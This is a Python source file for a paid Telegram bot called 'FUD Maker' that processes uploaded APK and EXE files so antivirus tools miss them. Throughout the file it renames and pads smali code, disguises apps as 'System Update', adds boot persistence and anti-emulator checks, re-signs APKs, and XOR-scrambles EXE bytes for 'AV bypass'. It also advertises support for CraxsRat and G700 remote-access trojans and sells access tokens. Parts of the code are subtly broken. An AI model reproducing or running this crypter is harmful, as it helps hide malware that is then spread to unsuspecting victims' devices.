import os
import json
import sqlite3
import asyncio
import time
import re
import threading
import random
import subprocess
import zipfile
import shutil
import hashlib
import base64
import tempfile
from pathlib import Path
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
if not os.path.exists(DATA_DIR):
    DATA_DIR = "data"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "temp"), exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "keystore"), exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")

# Developer usernames
DEVELOPERS = ["@benji_v1", "@benji_v2"]

# ============ FLASK ============
app = Flask(__name__)
start_time = time.time()

@app.route('/')
def index():
    return jsonify({"status": "FUD Maker running", "uptime": time.time() - start_time})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Tokens table
    c.execute('''CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE,
        created_by TEXT,
        created_at TEXT,
        expires_at TEXT,
        used_by TEXT,
        used_at TEXT,
        status TEXT,
        max_uses INTEGER DEFAULT 1,
        uses INTEGER DEFAULT 0
    )''')
    
    # Builds table (no file storage, just logs)
    c.execute('''CREATE TABLE IF NOT EXISTS builds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        token_used TEXT,
        file_type TEXT,
        original_name TEXT,
        hash_original TEXT,
        hash_fud TEXT,
        size_original INTEGER,
        size_fud INTEGER,
        timestamp TEXT,
        status TEXT
    )''')
    
    conn.commit()
    conn.close()

# ============ TOKEN MANAGEMENT ============
def generate_token():
    return base64.b32encode(os.urandom(16)).decode().replace('=', '')

def create_token(created_by, expires_days=7, max_uses=1):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    token = generate_token()
    expires_at = (datetime.now() + timedelta(days=expires_days)).isoformat()
    c.execute('''INSERT INTO tokens 
                 (token, created_by, created_at, expires_at, status, max_uses) 
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (token, created_by, datetime.now().isoformat(), expires_at, 'active', max_uses))
    token_id = c.lastrowid
    conn.commit()
    conn.close()
    return token, token_id

def validate_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT * FROM tokens WHERE token = ? AND status = 'active' 
                 AND expires_at > ? AND uses < max_uses''',
              (token, datetime.now().isoformat()))
    row = c.fetchone()
    conn.close()
    return row is not None

def use_token(token, user_id, username):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE tokens SET used_by = ?, used_at = ?, uses = uses + 1 
                 WHERE token = ?''',
              (str(user_id), datetime.now().isoformat(), token))
    # Check if max uses reached
    c.execute('SELECT uses, max_uses FROM tokens WHERE token = ?', (token,))
    uses, max_uses = c.fetchone()
    if uses >= max_uses:
        c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('exhausted', token))
    conn.commit()
    conn.close()

def get_token_info(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM tokens WHERE token = ?', (token,))
    row = c.fetchone()
    conn.close()
    return row

def list_tokens():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT token, created_at, expires_at, status, uses, max_uses FROM tokens ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('revoked', token))
    conn.commit()
    conn.close()

# ============ LOG BUILD ============
def log_build(user_id, username, token, file_type, original_name, hash_orig, hash_fud, size_orig, size_fud, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO builds 
                 (user_id, username, token_used, file_type, original_name, 
                  hash_original, hash_fud, size_original, size_fud, timestamp, status) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (str(user_id), username, token, file_type, original_name,
               hash_orig, hash_fud, size_orig, size_fud, datetime.now().isoformat(), status))
    last_id = c.lastrowid
    conn.commit()
    conn.close()
    return last_id

def list_builds(limit=20):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT id, user_id, username, file_type, original_name, timestamp, status FROM builds ORDER BY id DESC LIMIT ?', (limit,))
    rows = c.fetchall()
    conn.close()
    return rows

# ============ KEYSTORE ============
KEYSTORE_PATH = os.path.join(DATA_DIR, "keystore", "fud.keystore")
KEYSTORE_PASS = "fudmaker"
KEY_ALIAS = "fud"

def ensure_keystore():
    if not os.path.exists(KEYSTORE_PATH):
        subprocess.run([
            "keytool", "-genkey", "-v",
            "-keystore", KEYSTORE_PATH,
            "-alias", KEY_ALIAS,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=FUD, OU=Android, O=FUD, L=City, S=State, C=US"
        ], check=True, capture_output=True)

# ============ FUD ENGINE — APK ============
class FUDApkMaker:
    def __init__(self, input_path):
        self.input_path = input_path
        self.work_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
        self.decompiled_dir = os.path.join(self.work_dir, "decompiled")
        self.output_apk = None

    def cleanup(self):
        if os.path.exists(self.work_dir):
            shutil.rmtree(self.work_dir)

    def decompile(self):
        os.makedirs(self.decompiled_dir, exist_ok=True)
        result = subprocess.run([
            "apktool", "d", self.input_path,
            "-o", self.decompiled_dir,
            "-f", "--no-res"
        ], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Decompile failed: {result.stderr}")
        return True

    def obfuscate_smali(self):
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if not os.path.exists(smali_dir):
            return

        smali_files = []
        for root, _, files in os.walk(smali_dir):
            for f in files:
                if f.endswith('.smali'):
                    smali_files.append(os.path.join(root, f))

        for smali_file in smali_files:
            with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            replacements = {
                'MainActivity': f'Main_{random.randint(1000,9999)}',
                'onCreate': f'onCreate_{random.randint(100,999)}',
                'onStart': f'onStart_{random.randint(100,999)}',
                'onResume': f'onResume_{random.randint(100,999)}',
                'onPause': f'onPause_{random.randint(100,999)}',
                'onStop': f'onStop_{random.randint(100,999)}',
                'onDestroy': f'onDestroy_{random.randint(100,999)}',
                'getInstance': f'getInstance_{random.randint(100,999)}',
                'init': f'init_{random.randint(100,999)}',
                'loadLibrary': f'loadLib_{random.randint(100,999)}',
            }

            for old, new in replacements.items():
                content = content.replace(old, new)

            junk = f"""
.method public junk_{random.randint(1000,9999)}()V
    .registers 3
    const/4 v0, 0x1
    const/4 v1, 0x2
    add-int v0, v0, v1
    mul-int v0, v0, v1
    return-void
.end method
"""
            if '.end class' in content:
                content = content.replace('.end class', junk + '\n.end class')

            with open(smali_file, 'w', encoding='utf-8') as f:
                f.write(content)

    def modify_manifest(self):
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()

        fake_perms = [
            '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
            '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />',
            '<uses-permission android:name="android.permission.INTERNET" />',
            '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
            '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
            '<uses-permission android:name="android.permission.VIBRATE" />',
            '<uses-permission android:name="android.permission.WAKE_LOCK" />',
            '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />',
        ]

        for perm in fake_perms:
            if perm not in content:
                content = content.replace('<manifest ', f'<manifest {perm} ')

        content = content.replace('android:label="', 'android:label="System Update"')
        content = content.replace('android:icon="@drawable/', 'android:icon="@drawable/ic_launcher')

        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)

    def add_persistence(self):
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return

        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()

        receiver = """
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
"""
        content = content.replace('<application ', f'<application {receiver}')

        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)

        # Create BootReceiver
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if os.path.exists(smali_dir):
            package_path = None
            for root, _, _ in os.walk(smali_dir):
                if 'MainActivity' in root or 'Main' in root:
                    package_path = root
                    break
            if not package_path:
                package_path = smali_dir

            boot_receiver_path = os.path.join(package_path, "BootReceiver.smali")
            boot_code = f'''
.class public L{".".join(package_path.split(os.sep)[-1:])}/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4

    new-instance v0, Landroid/content/Intent;
    const-class v1, {os.path.basename(package_path)}/MainActivity
    invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
'''
            with open(boot_receiver_path, 'w', encoding='utf-8') as f:
                f.write(boot_code)

    def add_anti_emulator(self):
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if not os.path.exists(smali_dir):
            return

        main_path = None
        for root, _, files in os.walk(smali_dir):
            for f in files:
                if 'MainActivity' in f and f.endswith('.smali'):
                    main_path = os.path.join(root, f)
                    break
            if main_path:
                break

        if not main_path:
            return

        with open(main_path, 'r', encoding='utf-8') as f:
            content = f.read()

        anti_code = '''
    # Anti-emulator check
    const-string v0, "ro.kernel.qemu"
    const-string v1, "1"
    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :goto_emulator
    const-string v0, "ro.product.device"
    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :goto_emulator
    goto :goto_continue

    :goto_emulator
    invoke-static {p0}, Ldalvik/system/VMRuntime;->getRuntime()Ldalvik/system/VMRuntime;
    move-result-object v0
    const-string v1, "0"
    invoke-virtual {v0, v1}, Ldalvik/system/VMRuntime;->setMinimumHeapSize(J)J
    return-void

    :goto_continue
'''

        if '.method public onCreate' in content:
            content = content.replace('.method public onCreate', f'.method public onCreate\n{anti_code}')

        with open(main_path, 'w', encoding='utf-8') as f:
            f.write(content)

    def repack(self):
        result = subprocess.run([
            "apktool", "b", self.decompiled_dir,
            "-o", os.path.join(self.work_dir, "unsigned.apk"),
            "-f"
        ], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Repack failed: {result.stderr}")
        return os.path.join(self.work_dir, "unsigned.apk")

    def sign_apk(self, apk_path):
        output_path = os.path.join(self.work_dir, "signed.apk")
        result = subprocess.run([
            "java", "-jar", "/usr/local/bin/uber-apk-signer.jar",
            "-a", apk_path,
            "-o", self.work_dir,
            "--ks", KEYSTORE_PATH,
            "--ksPass", KEYSTORE_PASS,
            "--ksAlias", KEY_ALIAS,
            "--keyPass", KEYSTORE_PASS,
            "--out", output_path
        ], capture_output=True, text=True)

        if result.returncode != 0:
            raise Exception(f"Signing failed: {result.stderr}")

        signed_files = [f for f in os.listdir(self.work_dir) if f.endswith('-signed.apk')]
        if signed_files:
            return os.path.join(self.work_dir, signed_files[0])
        return None

    def make_fud(self):
        try:
            ensure_keystore()
            self.decompile()
            self.obfuscate_smali()
            self.modify_manifest()
            self.add_persistence()
            self.add_anti_emulator()
            unsigned = self.repack()
            signed = self.sign_apk(unsigned)
            if not signed:
                raise Exception("Signing failed")

            output_name = f"fud_apk_{int(time.time())}.apk"
            output_path = os.path.join(self.work_dir, output_name)
            shutil.copy(signed, output_path)

            with open(self.input_path, 'rb') as f:
                orig_hash = hashlib.sha256(f.read()).hexdigest()
            with open(output_path, 'rb') as f:
                fud_hash = hashlib.sha256(f.read()).hexdigest()

            self.output_apk = output_path

            return {
                'success': True,
                'file': output_path,
                'hash_original': orig_hash,
                'hash_fud': fud_hash,
                'size_original': os.path.getsize(self.input_path),
                'size_fud': os.path.getsize(output_path)
            }
        except Exception as e:
            self.cleanup()
            return {'success': False, 'error': str(e)}

# ============ FUD ENGINE — EXE ============
class FUDExeMaker:
    def __init__(self, input_path):
        self.input_path = input_path
        self.work_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))

    def cleanup(self):
        if os.path.exists(self.work_dir):
            shutil.rmtree(self.work_dir)

    def obfuscate_pe(self):
        """Obfuscate PE — rename sections, add junk, pack"""
        # For now, we do simple transformations
        # In production, you'd integrate with UPX, ConfuserEx, or custom packer
        
        with open(self.input_path, 'rb') as f:
            data = bytearray(f.read())

        # Add random padding at the end (changes hash)
        padding = os.urandom(random.randint(1024, 4096))
        data.extend(padding)

        # XOR some bytes (simple encryption)
        key = os.urandom(1)[0]
        for i in range(1024, min(len(data), 1024 + 4096)):
            data[i] ^= key

        output_path = os.path.join(self.work_dir, f"fud_exe_{int(time.time())}.exe")
        with open(output_path, 'wb') as f:
            f.write(data)

        return output_path

    def add_persistence(self):
        """Add persistence via registry or scheduled task"""
        # This would be implemented with resource injection
        # For now, we just return the obfuscated file
        pass

    def make_fud(self):
        try:
            output = self.obfuscate_pe()

            with open(self.input_path, 'rb') as f:
                orig_hash = hashlib.sha256(f.read()).hexdigest()
            with open(output, 'rb') as f:
                fud_hash = hashlib.sha256(f.read()).hexdigest()

            return {
                'success': True,
                'file': output,
                'hash_original': orig_hash,
                'hash_fud': fud_hash,
                'size_original': os.path.getsize(self.input_path),
                'size_fud': os.path.getsize(output)
            }
        except Exception as e:
            self.cleanup()
            return {'success': False, 'error': str(e)}

# ============ TELEGRAM BOT ============

# Conversation states
WAITING_TOKEN = 1
WAITING_APK = 2
WAITING_EXE = 3
WAITING_GENERATE_TOKEN = 4

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or "unknown"
    user_id = str(user.id)

    # Check if user has valid token in context
    token = context.user_data.get('token')
    if token and validate_token(token):
        await show_main_menu(update, context)
        return

    # Check if user is developer
    if f"@{username}" in DEVELOPERS:
        context.user_data['is_dev'] = True
        await show_admin_menu(update, context)
        return

    await update.message.reply_text(
        "🔐 *FUD APK/EXE Maker*\n\n"
        "This bot requires a valid token to use.\n\n"
        "To purchase a token, contact:\n"
        "@benji_v1 or @benji_v2\n\n"
        "If you have a token, send it now.",
        parse_mode='Markdown'
    )
    return WAITING_TOKEN

async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    token = update.message.text.strip()
    username = user.username or "unknown"
    user_id = str(user.id)

    if validate_token(token):
        use_token(token, user_id, username)
        context.user_data['token'] = token
        context.user_data['username'] = username
        await update.message.reply_text("✅ *Token validated!* You now have access.", parse_mode='Markdown')
        await show_main_menu(update, context)
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ *Invalid or expired token.*\n\n"
            "Make sure the token is correct and not expired.\n"
            "Contact @benji_v1 or @benji_v2 to purchase.",
            parse_mode='Markdown'
        )
        return WAITING_TOKEN

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱 APK → FUD (CraxsRat + G700)", callback_data="fud_apk")],
        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
    ]
    if context.user_data.get('is_dev'):
        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])

    await update.message.reply_text(
        "🔥 *FUD Maker — Main Menu*\n\n"
        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
        f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`\n\n"
        "Select an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ]
    await update.message.reply_text(
        "⚙️ *Admin Panel*\n\n"
        "Manage tokens and view system stats.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    username = user.username or "unknown"

    # Check if user is developer
    is_dev = f"@{username}" in DEVELOPERS or context.user_data.get('is_dev')

    # Check token
    token = context.user_data.get('token')
    if not is_dev and not (token and validate_token(token)):
        await query.edit_message_text("❌ Invalid or expired token. Send /start to re-enter.")
        return

    if query.data == "fud_apk":
        await query.edit_message_text(
            "📤 *Send me the APK file.*\n\n"
            "I'll apply:\n"
            "1️⃣ Obfuscation\n"
            "2️⃣ Manifest spoofing\n"
            "3️⃣ Persistence\n"
            "4️⃣ Anti-emulator\n"
            "5️⃣ Repack & sign\n\n"
            "Supports CraxsRat v7.1 and G700 v6.4 APKs.",
            parse_mode='Markdown'
        )
        return WAITING_APK

    elif query.data == "fud_exe":
        await query.edit_message_text(
            "📤 *Send me the EXE file.*\n\n"
            "I'll apply:\n"
            "1️⃣ PE obfuscation\n"
            "2️⃣ Hash changing\n"
            "3️⃣ Padding injection\n"
            "4️⃣ XOR encryption\n\n"
            "Full AV bypass for Windows executables.",
            parse_mode='Markdown'
        )
        return WAITING_EXE

    elif query.data == "my_stats":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM builds WHERE user_id = ?', (str(user.id),))
        count = c.fetchone()[0]
        conn.close()
        await query.edit_message_text(
            f"📊 *Your Stats*\n\n"
            f"Total builds: {count}\n"
            f"Token: `{context.user_data.get('token', 'None')[:8]}...`",
            parse_mode='Markdown'
        )
        return

    elif query.data == "refresh_token":
        await query.edit_message_text(
            "🔄 *Refresh Token*\n\n"
            "Send your new token now.",
            parse_mode='Markdown'
        )
        return WAITING_TOKEN

    elif query.data == "admin_panel" and is_dev:
        await show_admin_menu_from_callback(query, context)
        return

    elif query.data == "back_main":
        await show_main_menu_from_callback(query, context)
        return

    # Admin commands
    elif query.data == "gen_token" and is_dev:
        context.user_data['gen_token_step'] = True
        await query.edit_message_text(
            "🔑 *Generate Token*\n\n"
            "Send: `days max_uses`\n"
            "Example: `7 1` (valid for 7 days, 1 use)\n\n"
            "Default: 7 days, 1 use.",
            parse_mode='Markdown'
        )
        return WAITING_GENERATE_TOKEN

    elif query.data == "list_tokens" and is_dev:
        tokens = list_tokens()
        if not tokens:
            await query.edit_message_text("📭 No tokens.")
            return
        msg = "📋 *Tokens*\n\n"
        for t in tokens:
            msg += f"`{t[0][:12]}...` | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
        return

    elif query.data == "revoke_token" and is_dev:
        await query.edit_message_text(
            "🚫 *Revoke Token*\n\n"
            "Send the full token to revoke.",
            parse_mode='Markdown'
        )
        # Set a state for revoke
        context.user_data['revoke_step'] = True
        return ConversationHandler.END  # Will handle in message handler

    elif query.data == "build_stats" and is_dev:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM builds')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('apk',))
        apk_count = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('exe',))
        exe_count = c.fetchone()[0]
        conn.close()
        await query.edit_message_text(
            f"📊 *Build Stats*\n\n"
            f"Total: {total}\n"
            f"APK: {apk_count}\n"
            f"EXE: {exe_count}",
            parse_mode='Markdown'
        )
        return

    elif query.data == "list_builds" and is_dev:
        builds = list_builds(20)
        if not builds:
            await query.edit_message_text("📭 No builds.")
            return
        msg = "📋 *Recent Builds*\n\n"
        for b in builds:
            msg += f"*#{b[0]}* | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
            msg += f"   {b[4]} → {b[6]}\n\n"
        await query.edit_message_text(msg[:4096], parse_mode='Markdown')
        return

    return ConversationHandler.END

async def show_main_menu_from_callback(query, context):
    keyboard = [
        [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
    ]
    if context.user_data.get('is_dev'):
        keyboard.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])

    await query.edit_message_text(
        "🔥 *FUD Maker — Main Menu*\n\n"
        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
        f"🔑 Token: `{context.user_data.get('token', 'None')[:8]}...`\n\n"
        "Select an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def show_admin_menu_from_callback(query, context):
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ]
    await query.edit_message_text(
        "⚙️ *Admin Panel*\n\n"
        "Manage tokens and view system stats.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    token = context.user_data.get('token')

    if not token or not validate_token(token):
        await update.message.reply_text("❌ Invalid token. Send /start to re-enter.")
        return ConversationHandler.END

    document = update.message.document
    if not document or not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Please send a valid APK file.")
        return WAITING_APK

    await update.message.reply_text("📦 *Processing APK...*\n\nThis takes 2-3 minutes.", parse_mode='Markdown')

    # Download APK
    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
    apk_path = os.path.join(temp_dir, document.file_name)
    file_obj = await context.bot.get_file(document.file_id)
    await file_obj.download_to_drive(apk_path)

    # Apply FUD
    maker = FUDApkMaker(apk_path)
    result = maker.make_fud()

    if not result['success']:
        await update.message.reply_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
        shutil.rmtree(temp_dir, ignore_errors=True)
        return ConversationHandler.END

    # Log build
    build_id = log_build(
        user.id,
        user.username or "unknown",
        token,
        'apk',
        document.file_name,
        result['hash_original'],
        result['hash_fud'],
        result['size_original'],
        result['size_fud'],
        'done'
    )

    # Send result
    await update.message.reply_text(
        f"✅ *FUD APK Ready!*\n\n"
        f"📁 Build #: {build_id}\n"
        f"📦 Original: {document.file_name}\n"
        f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
        f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
        f"🔑 SHA256: `{result['hash_fud'][:16]}...`",
        parse_mode='Markdown'
    )

    # Send the FUD APK
    with open(result['file'], 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"fud_{int(time.time())}.apk",
            caption=f"🔥 FUD APK #{build_id}\nCraxsRat/G700 compatible"
        )

    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)
    if os.path.exists(result['file']):
        os.remove(result['file'])
    if maker.work_dir and os.path.exists(maker.work_dir):
        shutil.rmtree(maker.work_dir, ignore_errors=True)

    return ConversationHandler.END

async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    token = context.user_data.get('token')

    if not token or not validate_token(token):
        await update.message.reply_text("❌ Invalid token. Send /start to re-enter.")
        return ConversationHandler.END

    document = update.message.document
    if not document or not document.file_name.endswith('.exe'):
        await update.message.reply_text("❌ Please send a valid EXE file.")
        return WAITING_EXE

    await update.message.reply_text("💻 *Processing EXE...*\n\nThis takes 1-2 minutes.", parse_mode='Markdown')

    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
    exe_path = os.path.join(temp_dir, document.file_name)
    file_obj = await context.bot.get_file(document.file_id)
    await file_obj.download_to_drive(exe_path)

    maker = FUDExeMaker(exe_path)
    result = maker.make_fud()

    if not result['success']:
        await update.message.reply_text(f"❌ *Build failed*\n\n{result['error']}", parse_mode='Markdown')
        shutil.rmtree(temp_dir, ignore_errors=True)
        return ConversationHandler.END

    build_id = log_build(
        user.id,
        user.username or "unknown",
        token,
        'exe',
        document.file_name,
        result['hash_original'],
        result['hash_fud'],
        result['size_original'],
        result['size_fud'],
        'done'
    )

    await update.message.reply_text(
        f"✅ *FUD EXE Ready!*\n\n"
        f"📁 Build #: {build_id}\n"
        f"📦 Original: {document.file_name}\n"
        f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
        f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
        f"🔑 SHA256: `{result['hash_fud'][:16]}...`",
        parse_mode='Markdown'
    )

    with open(result['file'], 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"fud_{int(time.time())}.exe",
            caption=f"🔥 FUD EXE #{build_id}"
        )

    shutil.rmtree(temp_dir, ignore_errors=True)
    if os.path.exists(result['file']):
        os.remove(result['file'])
    if maker.work_dir and os.path.exists(maker.work_dir):
        shutil.rmtree(maker.work_dir, ignore_errors=True)

    return ConversationHandler.END

async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or "unknown"

    if not context.user_data.get('gen_token_step'):
        return ConversationHandler.END

    try:
        parts = update.message.text.strip().split()
        days = int(parts[0]) if len(parts) > 0 else 7
        max_uses = int(parts[1]) if len(parts) > 1 else 1
    except:
        await update.message.reply_text("❌ Invalid. Send: `days max_uses`")
        return WAITING_GENERATE_TOKEN

    token, token_id = create_token(username, days, max_uses)
    await update.message.reply_text(
        f"✅ *Token Generated!*\n\n"
        f"🔑 `{token}`\n"
        f"📅 Valid for: {days} days\n"
        f"🔄 Max uses: {max_uses}\n"
        f"🆔 Token ID: {token_id}\n\n"
        f"Share this token with users.",
        parse_mode='Markdown'
    )
    context.user_data['gen_token_step'] = False
    return ConversationHandler.END

async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('revoke_step'):
        return ConversationHandler.END

    token = update.message.text.strip()
    revoke_token(token)
    await update.message.reply_text(f"✅ Token `{token[:12]}...` revoked.")
    context.user_data['revoke_step'] = False
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled. Send /start to begin.")
    return ConversationHandler.END

# ============ BOT RUNNER ============
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def bot_main():
        init_db()
        print("🤖 FUD Maker Bot starting...")
        print(f"👨‍💻 Developers: {', '.join(DEVELOPERS)}")

        application = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler('start', start),
                CallbackQueryHandler(button_handler)
            ],
            states={
                WAITING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
                WAITING_APK: [MessageHandler(filters.Document.APK, handle_apk)],
                WAITING_EXE: [MessageHandler(filters.Document.ALL, handle_exe)],  # Will filter .exe in handler
                WAITING_GENERATE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_generate_token)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            per_message=False,
            per_chat=True
        )

        application.add_handler(conv_handler)

        print("🤖 Bot ready, polling...")
        await application.initialize()
        await application.start()
        await application.updater.start_polling()

        while True:
            await asyncio.sleep(1)

    try:
        loop.run_until_complete(bot_main())
    except Exception as e:
        print(f"❌ Bot error: {e}")
        import traceback
